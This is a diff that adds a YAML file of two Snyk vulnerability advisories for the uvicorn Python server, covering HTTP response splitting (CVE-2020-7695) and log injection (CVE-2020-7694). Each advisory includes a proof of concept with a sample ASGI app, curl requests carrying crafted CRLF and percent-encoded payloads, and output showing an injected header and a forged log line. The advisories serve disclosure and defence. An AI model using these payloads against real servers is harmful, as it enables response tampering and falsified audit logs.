@@ -1,0 +1,83 @@
+---
+- id: snykio:pypi:uvicorn:570471
+  title: HTTP Response Splitting
+  description: "[uvicorn][1] is a lightning-fast ASGI server.\n\nAffected versions
+    of this package are vulnerable to HTTP Response\nSplitting. Uvicorn\\'s implementation
+    of the HTTP protocol for the\nhttptools parser is vulnerable to HTTP response
+    splitting. CRLF\nsequences are not escaped in the value of HTTP headers. Attackers
+    can\nexploit this to add arbitrary headers to HTTP responses, or even return\nan
+    arbitrary response body, whenever crafted input is used to construct\nHTTP headers.\n\n###
+    PoC   {#poc}\n\n    async def app(scope, receive, send):\n        assert scope['type']
+    == 'http'\n        await send({\n            'type': 'http.response.start',\n
+    \           'status': 200,\n            'headers': [\n                [b'Content-Type',
+    b'text/plain'],\n                [b'Referer', scope['path'].encode()],\n            ]\n
+    \       })  \n        await send({\n            'type': 'http.response.body',\n
+    \           'body': b'Hello, world!',\n        })\n    \n    uvicorn poc-3:app
+    --port 9999 --http httptools\n    \n    \n    To exploit this vulnerability, make
+    a GET request with a crafted URL path like so:\n    \n    \n    curl -v 'http://localhost:9999/foo%0d%0abar:%20baz'\n
+    \   \n    Uvicorn will return an additional HTTP header \"bar\" with the value
+    \"baz\":\n    \n    * Trying 127.0.0.1...\n    * Connected to localhost (127.0.0.1)
+    port 9999 (#0)\n    > GET /foo%0d%0abar:%20baz HTTP/1.1\n    > Host: localhost:9999\n
+    \   > User-Agent: curl/7.58.0\n    > Accept: */*\n    >\n    \n    < HTTP/1.1
+    200 OK\n    < date: Sun, 26 Apr 2020 22:38:18 GMT\n    < server: uvicorn\n    <
+    content-type: text/plain\n    < referer: /foo\n    < bar: baz\n    < transfer-encoding:
+    chunked\n    <\n\n\n\n[1]: https://github.com/encode/uvicorn\n"
+  affected_package: uvicorn
+  vulnerable_versions:
+  - ">= 0"
+  severity: medium
+  package_manager: pypi
+  cve:
+  - CVE-2020-7695
+  cwe:
+  - CWE-113
+  disclosed_date: 2020-07-10
+  created_date: 2020-07-20
+  last_modified_date: 2020-07-20
+  credit:
+  - Everardo Padilla Saca
+  references:
+  - https://github.com/encode/uvicorn
+  source_url: https://snyk.io/vuln/SNYK-PYTHON-UVICORN-570471
+- id: snykio:pypi:uvicorn:575560
+  title: Log Injection
+  description: "[uvicorn][1] is a lightning-fast ASGI server.\n\nAffected versions
+    of this package are vulnerable to Log Injection. The\nrequest logger provided
+    by the package is vulnerable to ASNI escape\nsequence injection. Whenever any
+    HTTP request is received, the default\nbehaviour of`uvicorn` is to log its details
+    to either the console or a\nlog file. When attackers request crafted URLs with
+    percent-encoded\nescape sequences, the logging component will log the URL after
+    it\\'s\nbeen processed with `urllib.parse.unquote`, therefore converting any\npercent-encoded
+    characters into their single-character equivalent, which\ncan have special meaning
+    in terminal emulators.\n\nBy requesting URLs with crafted paths, attackers can:\n\n*
+    Pollute uvicorn\\'s access logs, therefore jeopardising the integrity\n  of such
+    files.\n* Use ANSI sequence codes to attempt to interact with the terminal\n  emulator
+    that\\'s displaying the logs (either in real time or from a\n  file).\n\n### PoC
+    \  {#poc}\n\n    async def app(scope, receive, send):\n        print(scope)\n
+    \       assert scope['type'] == 'http'\n        await send({\n            'type':
+    'http.response.start',\n            'status': 200,\n            'headers': [\n
+    \               [b'Content-Type', b'text/plain']\n            ]\n        })  \n
+    \       await send({\n            'type': 'http.response.body',\n            'body':
+    b'Hello, world!',\n        })\n    `\n    \n    curl -v 'http://localhost:9999/logfile-injection%20HTTP%2f1.1%22%20200%20OK%0d%0aINFO:%20%20%20%20%208.8.8.8:1337%20-%20%22POST%20/admin/fake-action'\n
+    \   \n    $ cat log.txt\n    \n    INFO:     127.0.0.1:49242 - \"GET /logfile-injection
+    HTTP/1.1\" 200 OK\n    INFO:     8.8.8.8:1337 - \"POST /admin/fake-action HTTP/1.1\"
+    200 OK\n    \n    The previous GET request added a fake entry to the log file,
+    stating that the host at 8.8.8.8 made a POST request to /admin/fake-action.\n\n\n\n[1]:
+    https://github.com/encode/uvicorn\n"
+  affected_package: uvicorn
+  vulnerable_versions:
+  - ">= 0"
+  severity: low
+  package_manager: pypi
+  cve:
+  - CVE-2020-7694
+  cwe:
+  - CWE-117
+  disclosed_date: 2020-07-10
+  created_date: 2020-07-20
+  last_modified_date: 2020-07-20
+  credit:
+  - Everardo Padilla Saca
+  references:
+  - https://github.com/encode/uvicorn
+  source_url: https://snyk.io/vuln/SNYK-PYTHON-UVICORN-575560
